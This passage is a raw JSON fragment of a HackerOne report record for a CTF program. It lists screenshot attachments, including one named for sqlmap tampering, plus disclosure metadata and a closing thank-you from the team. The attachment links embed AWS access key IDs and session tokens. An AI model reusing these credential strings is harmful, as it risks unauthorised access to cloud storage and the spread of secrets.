26X-Amz-Signature=47bf6db504f170c4954cd2f4484d42a8873832e4f4d2d3104e421e5ee113cc9d","file_size":28056,"type":"image/png"},{"id":450898,"file_name":"Accounting-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/898/e2f0d942b25d4917a73cec571a956c2ce66db54d/Accounting-2.png?response-content-disposition=attachment%3B%20filename%3D%22Accounting-2.png%22%3B%20filename%2A%3DUTF-8%27%27Accounting-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=8be1c27c93fc31174c958697518fd038737cbdf94f8391e4e6e0d3840cb8d554","file_size":49812,"type":"image/png"},{"id":450899,"file_name":"sqlmap-tamper-h1-2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/899/e4577c9462e4320cd27d8b1cacfeaea9a7b9b589/sqlmap-tamper-h1-2.png?response-content-disposition=attachment%3B%20filename%3D%22sqlmap-tamper-h1-2.png%22%3B%20filename%2A%3DUTF-8%27%27sqlmap-tamper-h1-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=82a3180eb2c9565fe0adce6bcd4905a5a1bd48d41239b31af216e0d1e45a9605","file_size":378741,"type":"image/png"},{"id":450900,"file_name":"congrats-ctf.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/450/900/e7b0e733a9a59d03501986219eab30e8411c018b/congrats-ctf.png?response-content-disposition=attachment%3B%20filename%3D%22congrats-ctf.png%22%3B%20filename%2A%3DUTF-8%27%27congrats-ctf.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3VAHLH6Z%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061325Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCD4BvSsKgWcuX7%2Fh3b1LWkKs9s4yRHAxqyVwXJYWsOAwIhANvLMyKSbceDyM1TNnWf11IvuT7a61DuFVJhD%2BT%2Fb9IrKrQDCFcQARoMMDEzNjE5Mjc0ODQ5Igxmi6woSxw%2B6wnwBEMqkQPI1uJcvWS%2B7FQadeW43PrlhsnF4xiGOroakbutVFcvcHOdYKgLxjIJI5m7XwadzbZWnWfHV0%2B62Zb%2BWCUOjMWiTVIXVX7AwYN1lfeKcXEYUp0h0oyXmZ8r9%2Bj%2FMZUagb%2BGKS%2B8zxvRdQjMX1tdjoDe9OxP6o1mlqEZpx8AKw7LDp1Hz2ezBoeya6X2GupABl%2FOhOfLY3VwJj7aPTg85UEwxOdZDtc%2FqzwALQiQUZo0A1RP3Y8nbzGb8CydaoFTXkp8rbJlMiimc%2BP%2BkZhbzJrdAs2rl68CFeUO2KSps4veGXWDFFoEAu1EvHwhAyOhkUlWXmX73VMyIVDvCkiHkuulKA8DiBfGp90UyI0AqLxJxXh%2FgCjGVxceHzAhM03UULwYdje89A1ziU5p%2BKL3KWD4xZiWFhlIiy3U92ksRt8S3l2NanthhEGEvTgf6wIclSsc9f4UbYnjYnAAiXkBg6iZTwORuQ0lVt30ma%2B%2BklzemkOgRIzghR66jzWcsjfvliY27ODm9Z12Vrj3LNetmm3XRTDEg6v%2FBTrqAb0W67QCovsIpNAiT4CujLyYV%2FjYmZ4VKcAok0lQwqZsNMCoze3egJJr5KwJfEhstOKt8adGE2Rfh5M%2BaAuxUHx9CHzHYR0HmUar1TnotcADpaizJlkcQmrsTfX3xtHVR8i9rhilHwmpYSeCQBjKHP%2BS656Uyq6ksGCrQWI4ZK%2F8QgDLIm%2FkIF6FlqRmaPtAeqfdwNxXQoCBcVLYgai%2FvmYu0CSd0Q1ngm%2FQMLqJqwYCLLmqTZrGYBRc5a553mtVqPYXlzc8Pgvjp59x%2Fjbix5wBt%2BoNg6EeSWNYAv4D0k4TzkJ4Aj8N%2BdAfag%3D%3D\u0026X-Amz-Signature=5272cad8f5804d6e538087d281bb228fd0869e7833cf37cf9d84b8355a3be20a","file_size":64271,"type":"image/png"}],"allow_singular_disclosure_at":"2019-05-08T15:57:07.795Z","allow_singular_disclosure_after":-51891377.994723044,"singular_disclosure_allowed":true,"vote_count":56,"voters":["nytr0gen","checkm50","ramsexy","0xc0ffee","ewererewerwer","mygf","aryan2808","bl4ckh4ck5","eveeez","0xdeadbife","and 46 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4492839,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:33:06.178Z","updated_at":"2019-04-05T18:33:06.178Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"0xc0ffee","url":"/0xc0ffee"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509107,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:57:07.770Z","updated_at":"2019-04-08T15:57:07.770Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509108,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:57:12.556Z","updated_at":"2019-04-08T15:57:12.556Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}